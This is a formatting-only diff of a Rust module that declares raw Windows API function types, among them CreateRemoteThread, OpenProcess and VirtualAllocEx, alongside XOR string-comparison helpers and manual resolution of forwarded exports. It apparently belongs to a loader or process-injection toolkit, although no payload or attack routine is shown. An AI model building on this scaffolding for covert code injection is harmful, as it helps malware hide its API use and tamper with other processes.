@@ -5,12 +5,16 @@
 #[cfg(test)]
 mod tests;
 
-use core::ffi::{c_char, CStr};
 use crate::consts::*;
 use crate::crypto_util::*;
 use crate::svec::ToSVec;
-use crate::util::{compare_str_and_w_str_bytes, case_insensitive_compare_strs_as_bytes, compare_xor_str_and_str_bytes, compare_xor_str_and_w_str_bytes, copy_buffer, find_char, get_resource_bytes, strlen};
+use crate::util::{
+    case_insensitive_compare_strs_as_bytes, compare_str_and_w_str_bytes,
+    compare_xor_str_and_str_bytes, compare_xor_str_and_w_str_bytes, copy_buffer, find_char,
+    get_resource_bytes, strlen,
+};
 use crate::windows::ntdll::*;
+use core::ffi::{c_char, CStr};
 use core::mem;
 use core::ptr::addr_of;
 use core::slice::from_raw_parts;
@@ -69,10 +73,10 @@ pub type FnCreateRemoteThread = unsafe extern "system" fn(
     lpThreadId: *mut u32,
 ) -> usize;
 pub type FnCreateToolhelp32Snapshot =
-unsafe extern "system" fn(dwFlags: u32, th32ProcessID: u32) -> usize;
+    unsafe extern "system" fn(dwFlags: u32, th32ProcessID: u32) -> usize;
 pub type FnFreeConsole = unsafe extern "system" fn() -> u32;
 pub type FnFindResourceA =
-unsafe extern "system" fn(hModule: usize, lpName: usize, lptype: usize) -> usize;
+    unsafe extern "system" fn(hModule: usize, lpName: usize, lptype: usize) -> usize;
 pub type FnGetCurrentProcess = unsafe extern "system" fn() -> usize;
 pub type FnGetFileSize = unsafe extern "system" fn(hFile: usize, lpFileSizeHigh: *const u32) -> u32;
 pub type FnGetFinalPathNameByHandleA = unsafe extern "system" fn(
@@ -85,15 +89,15 @@ pub type FnGetLastError = unsafe extern "system" fn() -> u32;
 pub type FnGetModuleHandleA = unsafe extern "system" fn(lpModuleName: *const u8) -> usize;
 pub type FnGetModuleHandleW = unsafe extern "system" fn(lwModuleName: *const u16) -> usize;
 pub type FnGetProcAddress =
-unsafe extern "system" fn(hModule: usize, lpProcName: *const u8) -> usize;
+    unsafe extern "system" fn(hModule: usize, lpProcName: *const u8) -> usize;
 pub type FnGetProcessHeap = unsafe extern "system" fn() -> usize;
 pub type FnGetSystemDirectoryA = unsafe extern "system" fn(lpBuffer: *mut u8, uSize: u32) -> u32;
 pub type FnGetSystemDirectoryW = unsafe extern "system" fn(lpBuffer: *mut u16, uSize: u32) -> u32;
 pub type FnHeapAlloc =
-unsafe extern "system" fn(hHeap: usize, dwFlags: u32, dwBytes: usize) -> usize;
+    unsafe extern "system" fn(hHeap: usize, dwFlags: u32, dwBytes: usize) -> usize;
 pub type FnHeapFree = unsafe extern "system" fn(hHeap: usize, dwFlags: u32, lpMem: usize) -> u32;
 pub type FnHeapReAlloc =
-unsafe extern "system" fn(hHeap: usize, dwFlags: u32, lpMem: usize, dwBytes: usize) -> usize;
+    unsafe extern "system" fn(hHeap: usize, dwFlags: u32, lpMem: usize, dwBytes: usize) -> usize;
 pub type FnIsProcessorFeaturePresent = unsafe extern "system" fn(ProcessorFeature: u32) -> u32;
 pub type FnLoadLibraryA = unsafe extern "system" fn(lpLibFileName: *const u8) -> usize;
 pub type FnLoadResource = unsafe extern "system" fn(hModule: usize, hResInfo: usize) -> usize;
@@ -104,16 +108,16 @@ pub type FnOpenFile = unsafe extern "system" fn(
     uStyle: u32,
 ) -> i32;
 pub type FnOpenProcess =
-unsafe extern "system" fn(dwDesiredAccess: u32, bInheritHandle: u32, dwProcessId: u32) -> usize;
+    unsafe extern "system" fn(dwDesiredAccess: u32, bInheritHandle: u32, dwProcessId: u32) -> usize;
 pub type FnOVERLAPPED_COMPLETION_ROUTINE = unsafe extern "system" fn(
     dwErrorCode: u32,
     dwNumberOfBytesTransfered: u32,
     lpOverlapped: *mut OVERLAPPED,
 );
 pub type FnProcess32First =
-unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> u32;
+    unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> u32;
 pub type FnProcess32Next =
-unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> u32;
+    unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> u32;
 pub type FnReadFile = unsafe extern "system" fn(
     hFile: usize,
     lpBuffer: *mut u8,
@@ -152,7 +156,7 @@ pub type FnVirtualAllocEx = unsafe extern "system" fn(
     flProtect: u32,
 ) -> usize;
 pub type FnVirtualFree =
-unsafe extern "system" fn(lpAddress: usize, dwSize: usize, dwFreeType: u32) -> usize;
+    unsafe extern "system" fn(lpAddress: usize, dwSize: usize, dwFreeType: u32) -> usize;
 pub type FnVirtualFreeEx = unsafe extern "system" fn(
     hProcess: usize,
     lpAddress: usize,
@@ -171,7 +175,7 @@ pub type FnVirtualQuery = unsafe extern "system" fn(
     dwLength: usize,
 ) -> usize;
 pub type FnWaitForSingleObject =
-unsafe extern "system" fn(hProcess: usize, dwMilliseconds: u32) -> u32;
+    unsafe extern "system" fn(hProcess: usize, dwMilliseconds: u32) -> u32;
 pub type FnWriteFile = unsafe extern "system" fn(
     hFile: usize,
     lpBuffer: *const u8,
@@ -696,7 +700,6 @@ unsafe fn get_fwd_addr(proc_address: usize) -> usize {
         }
         Some(sz) => sz,
     };
-
     forward_dll[split_pos] = 0;
 
     let forward_handle = LoadLibraryA(forward_dll.as_ptr());
